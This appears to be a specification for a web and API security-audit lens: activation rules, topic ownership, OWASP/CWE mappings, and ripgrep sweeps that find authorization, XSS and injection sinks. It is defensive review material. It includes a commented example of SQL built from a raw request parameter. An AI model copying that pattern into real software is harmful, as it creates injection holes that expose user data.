---
name: web-and-api
title: Web application and API security
runs_in: fanout
activates_on:
  paths:
    - '**/routes/**'
    - '**/controllers/**'
    - '**/handlers/**'
    - '**/middleware/**'
    - '**/middleware.{ts,js}'
    - '**/api/**'
    - '**/app/api/**/route.{ts,js,mjs}'
    - '**/pages/api/**/*.{ts,js}'
    - '**/*.controller.{ts,js}'
    - '**/*Controller.{java,kt,cs,php}'
    - '**/server.{js,ts,mjs}'
    - '**/app.{js,ts,py}'
    - '**/main.{py,go,ts}'
    - '**/{urls,views,serializers,permissions}.py'
    - '**/{wsgi,asgi}.py'
    - '**/config/routes.rb'
    - '**/app/controllers/**/*.rb'
    - '**/routes/web.php'
    - '**/routes/api.php'
    - '**/*.graphql'
    - '**/*.gql'
    - '**/schema.{graphql,ts,py}'
    - '**/resolvers/**'
    - '**/*.proto'
    - '**/openapi.{yaml,yml,json}'
    - '**/swagger.{yaml,yml,json}'
    - '**/webhooks/**'
    - '**/*webhook*.{ts,js,py,go,rb,java,cs}'
    - '**/SecurityConfig*.{java,kt}'
    - '**/{Startup,Program}.cs'
    - '**/next.config.{js,mjs,ts}'
    - '**/{vercel.json,netlify.toml,_headers,staticwebapp.config.json}'
    - '**/nginx/**/*.conf'
    - '**/Caddyfile'
    - '**/helmet*.{ts,js}'
    - '**/cors*.{ts,js,py,go}'
  signals:
    - 'express'
    - 'fastify'
    - 'koa'
    - 'hono'
    - '@nestjs/common'
    - 'helmet'
    - 'cors'
    - 'csurf'
    - 'express-session'
    - 'express-rate-limit'
    - 'cookie-parser'
    - 'next'
    - '@remix-run/node'
    - '@sveltejs/kit'
    - 'jsonwebtoken'
    - 'jose'
    - 'passport'
    - '@apollo/server'
    - 'apollo-server-express'
    - 'graphql'
    - 'graphql-yoga'
    - 'type-graphql'
    - 'graphql-armor'
    - 'graphql-depth-limit'
    - 'dataloader'
    - 'flask'
    - 'fastapi'
    - 'starlette'
    - 'django'
    - 'rest_framework'
    - 'werkzeug'
    - 'pyjwt / `import jwt`'
    - 'requests'
    - 'httpx'
    - 'aiohttp'
    - 'gunicorn'
    - 'uvicorn'
    - 'spring-boot-starter-web'
    - 'spring-boot-starter-security'
    - 'spring-boot-starter-actuator'
    - '@RestController'
    - '@PreAuthorize'
    - 'Microsoft.AspNetCore'
    - '[ApiController]'
    - '[Authorize]'
    - 'ValidateAntiForgeryToken'
    - 'rails / actionpack'
    - 'protect_from_forgery'
    - 'skip_before_action :verify_authenticity_token'
    - 'laravel/framework'
    - 'Illuminate\Http\Request'
    - 'gin-gonic/gin'
    - 'gorilla/mux'
    - 'go-chi/chi'
    - 'labstack/echo'
    - 'net/http + http.HandleFunc'
    - 'httputil.NewSingleHostReverseProxy'
    - 'grpc / @grpc/grpc-js / grpcio'
    - 'grpc reflection.Register'
    - 'ws'
    - 'socket.io'
    - 'websockets'
    - 'gorilla/websocket'
    - 'EventSource / text/event-stream'
    - 'axios'
    - 'node-fetch'
    - 'undici'
    - 'svix'
    - 'stripe.webhooks.constructEvent'
    - 'X-Hub-Signature-256'
    - 'crypto.timingSafeEqual'
    - 'hmac.compare_digest'
    - 'Access-Control-Allow-Origin'
    - 'Content-Security-Policy'
    - 'Strict-Transport-Security'
    - 'Set-Cookie / SameSite'
    - 'res.redirect / HttpResponseRedirect'
    - 'dangerouslySetInnerHTML'
    - '__schema / introspectionQuery'
  evidence_classes:
    source:
      state: consumed
    built-artifact:
      state: not-consumed
    deployed-state:
      state: consumed
      may_conclude: [runtime-misconfiguration]
    live-runtime:
      state: consumed
      may_conclude: [drift-from-source, runtime-misconfiguration]
owns:
  - authz-object-level
  - authz-property-level
  - authz-function-level
  - authentication-and-credential-flows
  - session-and-cookie-management
  - tenant-isolation-enforcement
  - csrf
  - cors-policy
  - security-headers-and-csp
  - open-redirect
  - injection-sql-nosql-orm
  - injection-command-and-template
  - deserialization-and-xxe
  - xss-and-output-encoding
  - path-traversal-and-file-access
  - file-upload-handling
  - mass-assignment-and-parameter-binding
  - ssrf-application-path
  - request-smuggling-and-proxy-normalization
  - cache-poisoning-and-deception
  - rate-limiting-and-request-quotas
  - graphql-api-surface
  - websocket-and-sse-authorization
  - api-inventory-and-version-deprecation
  - webhook-handler-integrity
  - third-party-api-response-trust
  - third-party-script-integrity-sri
  - secrets-in-browser-bundle
  - error-handling-and-verbose-responses
  - application-log-and-url-content
  - debug-and-admin-endpoint-exposure
  - client-trusted-business-rules      # business-logic (triage) files multi-step workflow abuse against this slug
  - race-conditions-and-toctou         # same: business-logic raises, this lens owns
defers:
  tls-and-certificate-validation: crypto-and-key-management
  jwt-jws-and-jwks-verification: crypto-and-key-management
  oauth-oidc-flow-correctness: crypto-and-key-management
  saml-assertion-validation: crypto-and-key-management
  password-hashing-and-kdf-parameters: crypto-and-key-management
  symmetric-encryption-and-nonce-handling: crypto-and-key-management
  hmac-and-constant-time-comparison: crypto-and-key-management
  csprng-and-token-entropy: crypto-and-key-management
  hardcoded-credentials-and-key-material: crypto-and-key-management
  dependency-pinning-and-lockfiles: cicd-and-supply-chain
  dependency-confusion-and-registry-config: cicd-and-supply-chain
  package-dependency-cves: cicd-and-supply-chain
  dependency-eol-and-abandonment: cicd-and-supply-chain
  sbom-generation-and-attachment: cicd-and-supply-chain
  iam-policy-and-privilege-scope: cloud-and-iac
  network-exposure-and-segmentation: cloud-and-iac
  object-storage-exposure: cloud-and-iac
  imds-hardening: cloud-and-iac
  serverless-function-exposure: cloud-and-iac
  managed-secret-service-configuration: cloud-and-iac
  control-plane-audit-logging: cloud-and-iac
  prompt-injection: llm-and-ai
  model-output-taint-propagation: llm-and-ai
  tool-call-authority-and-mediation: llm-and-ai
  rag-retrieval-authorization: llm-and-ai
  webview-bridge-trust: mobile-app-security
  deep-link-and-ipc-surface: mobile-app-security
  certificate-pinning-implementation: mobile-app-security
  mobile-local-data-storage: mobile-app-security
  soql-sosl-injection: salesforce-platform
  apex-sharing-declaration: salesforce-platform
  apex-crud-fls-enforcement: salesforce-platform
  apex-entry-point-exposure: salesforce-platform
  lwc-aura-vf-output-sinks: salesforce-platform
  salesforce-redirect-and-trusted-sites: salesforce-platform
  guest-user-and-site-exposure: salesforce-platform
  phi-classification: hipaa-and-phi
  minimum-necessary: hipaa-and-phi
  phi-access-audit-controls: hipaa-and-phi
  phi-severity-uplift: hipaa-and-phi
  lawful-basis-and-consent-capture: privacy-and-data-protection
  consent-gating-of-trackers: privacy-and-data-protection
  cookie-lawfulness-and-lifetime: privacy-and-data-protection
  third-party-destination-inventory: privacy-and-data-protection
  fingerprinting-and-tracking-techniques: privacy-and-data-protection
  dsr-fulfillment-mechanics: privacy-and-data-protection
  pci-scope-and-cardholder-data: privacy-and-data-protection
  personal-data-severity-uplift: privacy-and-data-protection
  trust-boundary-inventory: threat-modeling
  stride-decomposition: threat-modeling
  attack-tree-construction: threat-modeling
  exfiltration-path-enumeration: threat-modeling
  cross-boundary-attribution-logging: threat-modeling
  architecture-trust-design-gaps: threat-modeling
frameworks:
  - owasp-top-10          # 2025 A01-A10 is the body's section spine; the A10:2021 SSRF mapping stays as an in-body compatibility note
  - owasp-api-top-10      # 2023 API1-API10 walk
  - nist-sp-800-63b       # password guidance only (length over complexity, no forced rotation, breach-corpus check)
  - cwe                   # if a top-25 lineage is claimed anywhere in the body the identifier is exactly cwe-top-25; "SANS Top 25" is not a real list and must never appear
  # owasp-asvs deliberately omitted: the body's "ASVS L1/L2 patterns" claim is not traceable to a single ASVS requirement ID, and 5.0.0 renumbered the whole catalogue. Re-add this identifier only in the same change that cites real 5.0 requirement IDs in the body.
severity_floor: low
---

## Scope

This lens audits everything that answers an HTTP request or holds a long-lived connection to a browser or an API client: route tables and controllers, middleware chains, GraphQL and gRPC surfaces, WebSocket and SSE endpoints, webhook receivers, the outbound HTTP a request handler performs on a caller's behalf, the headers and cookies the response carries, and the JavaScript bundle shipped to the browser.

Four framing facts drive everything below.

- **Authentication is not authorization, and neither is a middleware registration.** "The user is logged in" and "this user may touch this object" are separate questions decided in separate places. The most common serious finding in this domain is a handler that answers the first and never asks the second.
- **The client is not a boundary.** A disabled button, a hidden field, a price computed in JavaScript, a `role` in `localStorage`, and a route the SPA never links to are all suggestions. Every endpoint is reachable with arbitrary arguments by anyone who can reach the host.
- **Controls terminated outside the reviewed file are still controls, and unverified controls are still unverified.** A rate limiter in a WAF, an authenticating gateway, a CSP added by a CDN — these are real, they are common, and they are invisible in the checkout. Neither "the handler is bare, therefore it is unauthenticated" nor "something upstream probably handles it" is a defensible sentence. Both directions require evidence; where there is none, the finding stays open with the assumption written out.
- **Every parser in the path is a parser.** A URL is parsed by a validator and again by a fetcher. A request is parsed by a proxy and again by an origin. A JSON body is parsed by a router, a validator and an ORM. Bugs in this domain overwhelmingly live in the disagreement between two parsers, not inside either one.

### Owns

| Topic | What that means here |
|---|---|
| `authz-object-level` | BOLA / IDOR. An identifier arrives in a path, query, body or header and the handler acts on the object without proving the caller may reach it. |
| `authz-property-level` | What comes back out and what may be written in, field by field: over-returning serializers, `SELECT *` responses, admin-only fields in a public schema. |
| `authz-function-level` | Whether the caller may invoke this operation at all: admin routes, privileged verbs, gRPC methods, GraphQL mutations. |
| `authentication-and-credential-flows` | Login, registration, password reset, magic links, MFA enrollment and verification, account enumeration, credential-policy quality. |
| `session-and-cookie-management` | Session identifier lifecycle and cookie security attributes: rotation, revocation, expiry, `Secure` / `HttpOnly` / `SameSite` / `__Host-`. |
| `tenant-isolation-enforcement` | Whether a tenant discriminator is applied at the layer that cannot be forgotten, and whether "no tenant" resolves to "all tenants". |
| `csrf` | State change driven by an ambient credential the browser attaches on its own. |
| `cors-policy` | `Access-Control-Allow-Origin` and its siblings: reflection, credentialed wildcards, unanchored origin regexes, `Origin: null`. |
| `security-headers-and-csp` | The response headers a browser acts on: CSP, HSTS, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, the `Cross-Origin-*` family. |
| `open-redirect` | A caller-controlled destination reached through a redirect, and what rides along to it. |
| `injection-sql-nosql-orm` | Query construction against a data store: SQL string building, NoSQL operator injection, ORM escape hatches. |
| `injection-command-and-template` | Shell, template, expression-language, LDAP and XPath sinks. |
| `deserialization-and-xxe` | Object deserialization of caller-controlled bytes, and XML parsers that resolve external entities. |
| `xss-and-output-encoding` | Untrusted data reaching an HTML, attribute, URL, JavaScript or CSS context without context-correct encoding. |
| `path-traversal-and-file-access` | Caller-influenced filesystem paths, static-file roots, archive extraction, and directory listing. |
| `file-upload-handling` | What the application accepts, where it puts it, what it names it, and how it serves it back. |
| `mass-assignment-and-parameter-binding` | A caller-supplied payload setting a field the caller was not entitled to set. Also the slug `salesforce-platform` defers to for the generic form of that defect. |
| `ssrf-application-path` | Outbound requests whose destination the caller influences, and the validate-then-connect gap between them. |
| `request-smuggling-and-proxy-normalization` | Disagreement between a front-end proxy and an origin about where one request ends and the next begins, and about what a path means. |
| `cache-poisoning-and-deception` | Unkeyed inputs reflected into cacheable responses, and cacheable responses that should never have been cacheable. |
| `rate-limiting-and-request-quotas` | Request-count and cost limits at the endpoint *and* at the business-flow level, including the key the limiter counts on. |
| `graphql-api-surface` | Introspection, depth and complexity, batching and aliasing, field-level authorization, error verbosity. |
| `websocket-and-sse-authorization` | Origin checking on upgrade, authorization at subscribe time and on reconnect, and per-connection limits. |
| `api-inventory-and-version-deprecation` | Live routes nobody remembers: old versions, undocumented endpoints, reflection and doc surfaces, "internal" APIs that are reachable. |
| `webhook-handler-integrity` | Signature verification on inbound webhooks, replay windows, and what the handler does before it verifies. |
| `third-party-api-response-trust` | Treating a vendor's response as trusted input: parsing it unsafely, rendering it, or following its redirects. |
| `third-party-script-integrity-sri` | Browser-side third-party code: `integrity` and `crossorigin` on CDN scripts, and what a compromised one would reach. |
| `secrets-in-browser-bundle` | Values that are secret sitting in code that ships to the client, including server-rendered props and env inlining. |
| `error-handling-and-verbose-responses` | What an error tells the caller, and what a failing dependency causes the application to decide. |
| `application-log-and-url-content` | What ends up in a log line, a URL, a `Referer` header or a stored request record. Identifier-in-URL findings are filed here; `hipaa-and-phi` and `privacy-and-data-protection` supply the classification and the severity uplift. |
| `debug-and-admin-endpoint-exposure` | Debug, profiling, health, metrics, admin and metadata endpoints reachable by someone who should not reach them. |
| `client-trusted-business-rules` | A rule enforced only where the client can change it: price, discount, quantity, entitlement, workflow step. The `business-logic` triage lens raises multi-step abuse against this slug; the finding is filed here. |
| `race-conditions-and-toctou` | Check-then-act windows and missing idempotency: double-spend, double-redeem, signup and limit races. |

### Does not own

Do not raise findings on these. Where the code shows one, note it in the candidate's `impact` as an aggravator and hand it to the owning lens with the file and line. Every entry below is a `defers` key in this lens's frontmatter.

- **crypto-and-key-management** — `tls-and-certificate-validation`, `jwt-jws-and-jwks-verification`, `oauth-oidc-flow-correctness`, `saml-assertion-validation`, `password-hashing-and-kdf-parameters`, `symmetric-encryption-and-nonce-handling`, `hmac-and-constant-time-comparison`, `csprng-and-token-entropy`, `hardcoded-credentials-and-key-material`. Four of these are routinely mis-filed here, so the boundary is drawn explicitly:
  - **Token *verification* is crypto's; token *handling* is this lens's.** Whether `alg` is pinned, whether HS/RS confusion is possible, whether the JWKS source is allowlisted, whether `aud`/`iss` are checked — all crypto. Whether the token is placed in a URL, whether logout revokes anything, whether the cookie carrying it has `Secure` and `HttpOnly`, whether the session rotates on privilege change — all here. One defect, one finding.
  - **Password *hashing* is crypto's; password *policy* is this lens's.** Argon2id/bcrypt/scrypt parameters, the bcrypt 72-byte truncation, pre-hashing NUL truncation: crypto. Length-over-complexity, forced rotation, breach-corpus checking, and rate limits on the login and reset endpoints: here.
  - **Token *entropy* is crypto's.** `Math.random()` for a session identifier or a reset token is `csprng-and-token-entropy`. That the reset token is single-use, expiring, and invalidated on consumption is here.
  - **Constant-time comparison is crypto's.** That a webhook handler verifies its signature *at all*, before doing work, with a replay window, is here.
- **cicd-and-supply-chain** — `dependency-pinning-and-lockfiles`, `dependency-confusion-and-registry-config`, `package-dependency-cves`, `dependency-eol-and-abandonment`, `sbom-generation-and-attachment`. The whole of OWASP `A03:2025 Software Supply Chain Failures` routes there; this lens keeps only the browser-side half, `third-party-script-integrity-sri`, because the artifact is a `<script>` tag in a response this lens grades.
- **cloud-and-iac** — `iam-policy-and-privilege-scope`, `network-exposure-and-segmentation`, `object-storage-exposure`, `imds-hardening`, `serverless-function-exposure`, `managed-secret-service-configuration`, `control-plane-audit-logging`. Public buckets, `0.0.0.0/0` ingress, `AuthType: NONE`, IMDSv2 enforcement and log retention are all that lens's. This lens keeps the application-side reachability question — whether a request handler can be steered at the metadata address at all — under `ssrf-application-path`.
- **llm-and-ai** — `prompt-injection`, `model-output-taint-propagation`, `tool-call-authority-and-mediation`, `rag-retrieval-authorization`. Model output reaching an HTML, shell or SQL sink is a taint finding there; the sink itself is this lens's slug, and the two must not both be filed.
- **mobile-app-security** — `webview-bridge-trust`, `deep-link-and-ipc-surface`, `certificate-pinning-implementation`, `mobile-local-data-storage`. DOM XSS inside a WebView stays here; the bridge that exposes native capability to it does not.
- **salesforce-platform** — `soql-sosl-injection`, `apex-sharing-declaration`, `apex-crud-fls-enforcement`, `apex-entry-point-exposure`, `lwc-aura-vf-output-sinks`, `salesforce-redirect-and-trusted-sites`, `guest-user-and-site-exposure`. The platform variants have their own slugs and their own severity model. **The reciprocal is load-bearing: that lens defers `mass-assignment-and-parameter-binding` here**, so a caller-supplied payload writing a field the caller could not set is this lens's finding even when the code is Apex.
- **hipaa-and-phi** — `phi-classification`, `minimum-necessary`, `phi-access-audit-controls`, `phi-severity-uplift`. Whether a field is ePHI, whether a non-treatment surface returns more than its purpose needs, and the uplift that follows are decided there. This lens finds the access-control defect and the log or URL that carries the value.
- **privacy-and-data-protection** — `lawful-basis-and-consent-capture`, `consent-gating-of-trackers`, `cookie-lawfulness-and-lifetime`, `third-party-destination-inventory`, `fingerprinting-and-tracking-techniques`, `dsr-fulfillment-mechanics`, `pci-scope-and-cardholder-data`, `personal-data-severity-uplift`. A cookie has two independent audits: its security attributes are this lens's, its lawfulness and lifetime are that lens's. Do not file one as the other.
- **threat-modeling** — `trust-boundary-inventory`, `stride-decomposition`, `attack-tree-construction`, `exfiltration-path-enumeration`, `cross-boundary-attribution-logging`, `architecture-trust-design-gaps`. Two specific handoffs: "services trust each other because they share a network" is `architecture-trust-design-gaps`, not a CORS or auth finding here; and "no correlation identifier survives a hop, so an action cannot be attributed across a boundary" is `cross-boundary-attribution-logging`. What a single service writes into its own log line stays here.

### Frameworks this lens may and may not cite

- `owasp-top-10` (2025) and `owasp-api-top-10` (2023) are the two spines. Write category identifiers with their edition — `A01:2025`, `API1:2023` — because this lens deliberately keeps 2021 compatibility in scope, and a bare letter-number is ambiguous between two published lists whose fifth and tenth categories are entirely different bug classes.
- **`A09:2025 Security Logging and Alerting Failures` is the official category title. Do not "correct" it** to "Logging & Alerting Failures" or to the 2021 wording. Routing is done on these strings. The leading "Security" has been challenged once already and the challenge was rejected by a fact-check against `owasp.org` — that is why the lock is here rather than the string simply being written down. It is nonetheless the one string in this lens whose every routing decision depends on a single external source, so re-verify it against `owasp.org/Top10/2025/` before this lens is published. If it does turn out to be "Logging & Alerting Failures", the change is this line and the crosswalk row, and no routing moves.
- `nist-sp-800-63b` is cited for password and authenticator policy only. It is not an authority for hashing parameters here — that is crypto's slug.
- `cwe` identifiers are cited inline, and the ones this lens actually uses are these — a framework may not be declared without something traceable to it, which is the same rule that removed ASVS below:

  | Checklist item | CWE |
  |---|---|
  | [1](#1-object-level-authorization-bolaidor-authz-object-level) object-level authorization | `CWE-639` Authorization Bypass Through User-Controlled Key, `CWE-284` Improper Access Control |
  | [5](#5-mass-assignment-and-parameter-binding-mass-assignment-and-parameter-binding) mass assignment | `CWE-915` Improperly Controlled Modification of Dynamically-Determined Object Attributes |
  | [9](#9-cross-site-request-forgery-csrf) CSRF | `CWE-352` |
  | [12](#12-open-redirect-open-redirect) open redirect | `CWE-601` |
  | [13](#13-sql-nosql-and-orm-injection-injection-sql-nosql-orm) SQL/NoSQL injection | `CWE-89`, `CWE-943` |
  | [15](#15-cross-site-scripting-and-output-encoding-xss-and-output-encoding) XSS | `CWE-79` |
  | [16](#16-deserialization-and-xxe-deserialization-and-xxe) deserialization and XXE | `CWE-502`, `CWE-611` |
  | [17](#17-path-traversal-and-file-access-path-traversal-and-file-access) path traversal | `CWE-22` |
  | [19](#19-server-side-request-forgery-ssrf-application-path) SSRF | `CWE-918` |

  Timing-comparison weaknesses (`CWE-208`) are `constant-time-comparison` in `crypto-and-key-management` and are cited there, not here. If a top-25 lineage is ever claimed it is written exactly `cwe-top-25`. **"SANS Top 25" is not a real list and must never appear.**
- **Do not cite OWASP ASVS as an authority in this lens, and do not add `owasp-asvs` to `frameworks`.** The source material claimed "ASVS L1/L2 patterns" while containing no requirement traceable to an ASVS identifier, and 5.0.0 renumbered the whole catalogue, so any level claim inherited from the old text would be unverifiable at best. Re-add the identifier only in the same change that cites real ASVS 5.0 requirement IDs at the specific checks they justify.

### Category crosswalk

Every category resolves to a numbered Checklist item. Nothing in this lens refers to a category by a bare letter-number, and nothing refers backward to "the category above" — a relative reference is what silently rots into a pointer at the wrong bug class when a list is renumbered, which is exactly what happened to the material this table replaces.

| Category | Checklist item |
|---|---|
| `A01:2025` Broken Access Control | [1](#1-object-level-authorization-bolaidor-authz-object-level), [2](#2-tenant-isolation-tenant-isolation-enforcement), [3](#3-function-level-authorization-authz-function-level), [6](#6-property-level-authorization-on-the-way-out-authz-property-level), [19](#19-server-side-request-forgery-ssrf-application-path) |
| `A02:2025` Security Misconfiguration | [4](#4-debug-admin-and-metadata-endpoints-debug-and-admin-endpoint-exposure), [10](#10-cors-cors-policy), [11](#11-security-headers-and-csp-security-headers-and-csp), [17](#17-path-traversal-and-file-access-path-traversal-and-file-access), [25](#25-api-inventory-and-version-deprecation-api-inventory-and-version-deprecation) |
| `A03:2025` Software Supply Chain Failures | Not owned here. Routes to `cicd-and-supply-chain`, except the browser-side half in [28](#28-third-party-script-integrity-third-party-script-integrity-sri). |
| `A04:2025` Cryptographic Failures | Not owned here. Routes to `crypto-and-key-management`, except the transport *headers* in [11](#11-security-headers-and-csp-security-headers-and-csp) and the cookie attributes in [8](#8-sessions-and-cookies-session-and-cookie-management). |
| `A05:2025` Injection | [13](#13-sql-nosql-and-orm-injection-injection-sql-nosql-orm), [14](#14-command-and-template-injection-injection-command-and-template), [15](#15-cross-site-scripting-and-output-encoding-xss-and-output-encoding) |
| `A06:2025` Insecure Design | [32](#32-client-trusted-business-rules-client-trusted-business-rules), [22](#22-rate-limiting-and-request-quotas-rate-limiting-and-request-quotas), [7](#7-authentication-and-credential-flows-authentication-and-credential-flows). "Services trust each other by network position" is `architecture-trust-design-gaps` in `threat-modeling`. |
| `A07:2025` Authentication Failures | [7](#7-authentication-and-credential-flows-authentication-and-credential-flows), [8](#8-sessions-and-cookies-session-and-cookie-management) |
| `A08:2025` Software or Data Integrity Failures | [16](#16-deserialization-and-xxe-deserialization-and-xxe), [26](#26-webhook-handler-integrity-webhook-handler-integrity), [28](#28-third-party-script-integrity-third-party-script-integrity-sri) |
| `A09:2025` Security Logging and Alerting Failures | [31](#31-application-log-and-url-content-application-log-and-url-content) |
| `A10:2025` Mishandling of Exceptional Conditions | [30](#30-error-handling-verbose-responses-and-fail-open-error-handling-and-verbose-responses) |
| `A10:2021` Server-Side Request Forgery | [19](#19-server-side-request-forgery-ssrf-application-path). The 2025 list has no standalone SSRF category; the topic is owned here regardless of which category a report maps it to. |
| `API1:2023` Broken Object Level Authorization | [1](#1-object-level-authorization-bolaidor-authz-object-level) |
| `API2:2023` Broken Authentication | [7](#7-authentication-and-credential-flows-authentication-and-credential-flows), [8](#8-sessions-and-cookies-session-and-cookie-management), [31](#31-application-log-and-url-content-application-log-and-url-content). Signature and claim verification route to `jwt-jws-and-jwks-verification` in `crypto-and-key-management`. |
| `API3:2023` Broken Object Property Level Authorization | [5](#5-mass-assignment-and-parameter-binding-mass-assignment-and-parameter-binding), [6](#6-property-level-authorization-on-the-way-out-authz-property-level) |
| `API4:2023` Unrestricted Resource Consumption | [22](#22-rate-limiting-and-request-quotas-rate-limiting-and-request-quotas), [18](#18-file-upload-handling-file-upload-handling), [23](#23-graphql-api-surface-graphql-api-surface) |
| `API5:2023` Broken Function Level Authorization | [3](#3-function-level-authorization-authz-function-level) |
| `API6:2023` Unrestricted Access to Sensitive Business Flows | [22](#22-rate-limiting-and-request-quotas-rate-limiting-and-request-quotas), [32](#32-client-trusted-business-rules-client-trusted-business-rules), [33](#33-race-conditions-and-toctou-race-conditions-and-toctou) |
| `API7:2023` Server-Side Request Forgery | [19](#19-server-side-request-forgery-ssrf-application-path) |
| `API8:2023` Security Misconfiguration | [4](#4-debug-admin-and-metadata-endpoints-debug-and-admin-endpoint-exposure), [10](#10-cors-cors-policy), [11](#11-security-headers-and-csp-security-headers-and-csp) |
| `API9:2023` Improper Inventory Management | [25](#25-api-inventory-and-version-deprecation-api-inventory-and-version-deprecation) |
| `API10:2023` Unsafe Consumption of APIs | [27](#27-third-party-api-response-trust-third-party-api-response-trust) |

### What cannot be determined from a repository

State these as assumptions with a verification step, never as findings, and never as clearances.

- **Whether a control is terminated in front of the application.** A WAF rule, a CDN header set, an API-gateway authorizer, an nginx `limit_req`, an IdP's native lockout. Their presence and their absence are both invisible here.
- **The runtime value of an environment-driven flag.** `NODE_ENV`, `DEBUG`, `FLASK_ENV`, `ASPNETCORE_ENVIRONMENT`, `APP_DEBUG` and a GraphQL server's `introspection` option are frequently correct in the committed default and wrong in the deployed environment, or the reverse. Read the default from the repository, say what it is, and say that the deployed value was not observed.
- **Which routes are internet-reachable.** An "internal" service, an admin host, a route bound to a private listener — reachability is deployment topology.
- **What the response actually carries at the edge.** Headers may be added, replaced or stripped by a CDN or reverse proxy after the application emits them, and a CSP assembled in two places is common.
- **Whether an identifier is guessable in production.** A UUIDv4 path parameter and a sequential integer are graded differently, and the repository shows the column type, not the values in production.
- **Who holds which role.** Role-to-user assignment is runtime data even when the role check is in the code.

## Activation coverage

Generic sink checks cross languages, but that is not the same as framework
coverage. An activated framework in the last row gets an explicit gap, not a
clean web result.

| Activation family | Status | Actionable body anchor | Evidence or limit |
|---|---|---|---|
| Express framework and middleware signals | COVERED | `authz-object-level` | fixture:V-001 |
| Generic Node server filename path | PARTIAL | `api-inventory-and-version-deprecation` | The compound extension glob inventories Node-shaped entry points but does not establish Express or framework coverage |
| Generic route, handler, middleware, API and mixed-language source umbrellas | PARTIAL | `authz-function-level` | Cross-language source and sink checks exist; a matching path alone does not establish framework coverage |
| Java or Kotlin controllers and Spring security surfaces | PARTIAL | `injection-sql-nosql-orm` | V-002 proves the JDBC body detector, not web activation; Spring route and security checks remain framework-partial |
| Ruby on Rails surfaces | PARTIAL | `deserialization-and-xxe` | V-008 proves a Ruby deserialization detector, not a declared Rack activator; Rails checks remain framework-partial |
| Django, Flask and DRF surfaces | PARTIAL | `csrf` | Dedicated and generic checklist paths exist; framework-complete fixture pairs do not |
| ASP.NET and Laravel surfaces | PARTIAL | `authz-function-level` | Dedicated and generic checklist paths exist; framework-complete fixture pairs do not |
| GraphQL, WebSocket, SSE, gRPC and OpenAPI surfaces | PARTIAL | `graphql-api-surface` | Dedicated protocol checklists exist; schema, transport and generated behavior remain incomplete |
| Koa, Hono, Nest and Next surfaces | PARTIAL | `authz-function-level` | Narrow route and sink checks exist; broad framework semantics are not covered |
| Go Chi signals | PARTIAL | `authz-function-level` | Middleware-order guidance explicitly covers Chi; router-complete detector coverage does not |
| Outbound Python, Go and Node HTTP-client signals | PARTIAL | `third-party-api-response-trust` | SSRF, destination and response-trust checks exist; client-specific redirect and resolver behavior requires reading |
| Webhook receiver and signature signals | PARTIAL | `webhook-handler-integrity` | Signature, freshness and replay checks exist; provider-specific semantics are incomplete |
| Nginx, header configuration and generic output-sink signals | PARTIAL | `security-headers-and-csp` | Actionable header and sink checks exist; deployment inheritance and framework defaults require reading |
| Fastify, Remix, SvelteKit, FastAPI, Starlette, Gin, Gorilla, Echo, net/http, Caddy and static-host configs | NOT ASSESSED | — | Activation-only or isolated literals with no dedicated actionable body path |

## Checklist

Every item is anchored to a topic slug this lens owns. Work the sweeps first, then the items the sweeps produced hits for, then the items the stack makes relevant whether or not a sweep fired — absence of a literal is frequently the finding, and item 0 says which sweeps are inverted for that reason.

### 0. Highest-yield sweeps

Scope these to the application source directory. Every hit is a candidate to trace, not a finding. Every repository traversal carries `--hidden`: ripgrep prunes hidden directories before applying globs, while still excluding `.git`, so configuration and source under dot-directories otherwise disappear silently. The `rg` calls that consume a pipe or inspect the explicit `"$f"` selected by a preceding sweep are filters, not traversals, and deliberately do not carry it.

Repeated `--glob` arguments are intentional. ripgrep accepts brace alternates, but the documented `grep --include` fallback does not expand them; it can search zero files and exit 1 without stderr. Do not mechanically copy path-shaped ripgrep globs into `grep --include`: recursive GNU grep matches `--include` against each file's basename, not its repository-relative path. Translate suffix globs to repeated basename includes such as `--include='*.ts' --include='*.js'`, and move directory scoping into explicit path roots such as `src/ app/ pages/ components/` (enumerating the roots that actually exist). Before accepting exit 1 as no match, confirm that the translated command enumerated at least one intended file.

```bash
# route tables and their guards — read the mounting order, not just the handlers
rg -n --hidden --glob '**/*.ts' --glob '**/*.js' --glob '**/*.mjs' "app\.(use|get|post|put|patch|delete)\(|router\.(get|post|put|patch|delete)\(" .
rg -n --hidden --glob '**/*.py' "@(app|router|bp)\.(route|get|post|put|patch|delete)\(|path\(|re_path\(" .
rg -n --hidden --glob '**/*.java' --glob '**/*.kt' "@(Get|Post|Put|Patch|Delete|Request)Mapping|SecurityFilterChain" .

# an identifier straight off the request into a lookup — the BOLA shape
rg -n --hidden "findByPk\(|findById\(|\.get\(pk=|objects\.get\(id=|getById\(|findOne\(\{ ?_?id" .
rg -n --hidden "req\.params\.|req\.query\.|request\.args\.|request\.GET\.|params\[:" .

# whole-body binding — the mass-assignment shape
rg -n --hidden "Object\.assign\(|\.\.\.req\.body|update\(req\.body\)|create\(req\.body\)" .
rg -n --hidden "permit!|fields = '__all__'|exclude = \[\]|@ModelAttribute|TryUpdateModelAsync" .

# output sinks
rg -n --hidden "dangerouslySetInnerHTML|innerHTML\s*=|outerHTML\s*=|insertAdjacentHTML|v-html|\|\s*safe|\{\{\{|Html\.Raw|mark_safe|render_template_string" .

# injection sinks
rg -n --hidden "execute\(f\"|execute\(\"[^\"]*\"\s*[%+]|query\(`[^`]*\$\{|\.raw\(|createQuery\(\"[^\"]*\"\s*\+|cursor\.execute\(.*%\s*\(" .

# --- SQL assembled into a variable, then executed (two-step; the dominant Java/C#/Go/PHP shape) ---
# The sweep above only fires when the concatenation sits INSIDE the execute call. It cannot see
#     String sql = "SELECT ... WHERE id = '" + req.getParameter("id") + "'";
#     stmt.executeQuery(sql);
# which is how this bug is almost always written outside Python and JS. Two stages, both required
# in the same file, so a file that merely mentions SQL is not surfaced. Read every hit: a
# concatenated literal that only joins constants is not a finding.
rg --files-with-matches --hidden -i '"[^"]*\b(SELECT|INSERT INTO|UPDATE|DELETE FROM)\b[^"]*"\s*\+|\+\s*"[^"]*\b(WHERE|VALUES|SET|ORDER BY|LIKE)\b' . \
  | while IFS= read -r f; do
      rg -q 'executeQuery\(|executeUpdate\(|createStatement\(|prepareStatement\(|\.Query\(|\.Exec\(|mysqli_query\(|->query\(|ExecuteReader\(|ExecuteNonQuery\(' "$f" \
        && printf '%s\n' "$f"
    done
# rc note: an empty result means "no file satisfied BOTH stages", not "no SQL in the repo". If
# stage 1 alone returns nothing on a repo you know uses JDBC, the path operand or glob is wrong
# — say that, do not report clean.
